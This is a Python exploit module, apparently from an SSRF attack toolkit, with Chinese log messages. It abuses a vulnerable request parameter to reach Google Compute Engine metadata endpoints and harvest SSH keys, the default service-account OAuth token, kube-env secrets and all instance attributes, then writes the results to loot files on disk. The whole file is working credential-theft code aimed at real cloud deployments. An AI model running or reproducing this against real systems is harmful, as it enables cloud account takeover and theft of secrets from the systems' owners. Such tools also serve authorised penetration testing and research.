import logging

from core.utils import *

name = "gce"
description = "读取 GCE 上的敏感数据"
author = "mrtc0"
documentation = [
    "https://cloud.google.com/compute/docs/storing-retrieving-metadata",
    "https://hackerone.com/reports/341876",
    "https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/",
]


class exploit:
    endpoints = set()

    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        self.add_endpoints()

        r = requester.do_request(args.param, "")
        if r != None:
            default = r.text

            for endpoint in self.endpoints:
                payload = wrapper_http(endpoint[1], endpoint[0], "80")
                r = requester.do_request(args.param, payload)
                diff = diff_text(r.text, default)
                if diff != "":
                    # 显示默认请求与 SSRF 请求之间的差异
                    logging.info(f"\033[32m读取文件\033[0m : {payload}")
                    print(diff)

                    # 将差异写入文件
                    filename = endpoint[1].split("/")[-1]
                    if filename == "":
                        filename = endpoint[1].split("/")[-2:-1][0]

                    output_path = loot_path(requester.host, filename)
                    logging.info(f"\033[32m写入文件\033[0m : {payload} 到 {output_path}")
                    output_path.write_text(diff, encoding="utf-8")

    def add_endpoints(self):
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/service-accounts/default/token",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/attributes/kube-env?alt=json",
            )
        )
        self.endpoints.add(
            (
                "metadata.google.internal",
                "computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json",
            )
        )
